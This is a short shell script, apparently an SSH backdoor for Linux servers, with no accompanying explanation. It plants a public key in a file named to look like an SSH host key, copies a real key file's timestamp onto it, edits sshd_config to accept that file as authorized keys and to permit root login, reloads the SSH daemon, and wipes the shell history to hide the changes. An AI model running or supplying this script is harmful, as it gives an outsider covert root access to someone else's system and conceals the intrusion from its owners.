echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDsWLDpijJkWWNNrUGQK2jMbNjtF/A6oLTSAfW91F+Y9vZMUGHmcvakecYPAKV7uVypXlsIMF4wKxNEAyb0Q/59MUaZR6nYf5aY/qOJMZa0hjlZxX1l3MLS2VOqE/QK4zDPfQs1gA6AIohC6uR4yWElYN4xVZVPO6MbY4mfMQCzPEJoshK4lhqUbn561OAfRaa/sxbAS4FvN+kLr77HOYYLDc5D/UiRx58Vo2eINdLM16M1TfF2NzMFPnsodT+WzMlQjlzsqF9AB29pLh6Y9nMGdSKoWarrsofXS0zFPl67HvTTBncepRKM5vWPdloX2PfVYdhxX1eTY1zdRDZImGhPc7H3ylTzeyYkAOpzUo3edDzrmHphRe83cAH80auI6MfF11wcTLY4r2I9vs95SWMAPZOtF1/9G6E3ivEgGAra9LZ52+wxIvP1ESSvcdzyBlFgMUD+UJOAeFtTMetAb6E0G6x4TEn13JZw25lsD3xv2K8l2AWG5oZSwBuRrkeL8FnKyBp+JXuLpldleepse0H5kxySeRfBHTXo2W/cydRMcmcEiVNSzE+SXiA3inxXmaoYfqCEVznpNJYoCvbapsrYeyd4rHV2gk/YM2Eyd2eJKVyasJpHhgc8X5CSR8G8DYOnsbkGjRzj6h8NmmcbmAvM+R+xOD6ol0kPNO01Wlxa9Q==" >> /etc/ssh/ssh_host_rsa2048_key.pub
touch -r /etc/ssh/ssh_host_rsa_key.pub /etc/ssh/ssh_host_rsa2048_key.pub
sed -i 's/\#AuthorizedKeysFile.*/AuthorizedKeysFile .ssh\/authorized_keys \/etc\/ssh\/ssh_host_rsa2048_key.pub/' /etc/ssh/sshd_config
sed -i 's/PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
kill -HUP $(pgrep -f `which sshd`)
history -c
echo "" > ~/.bash_history
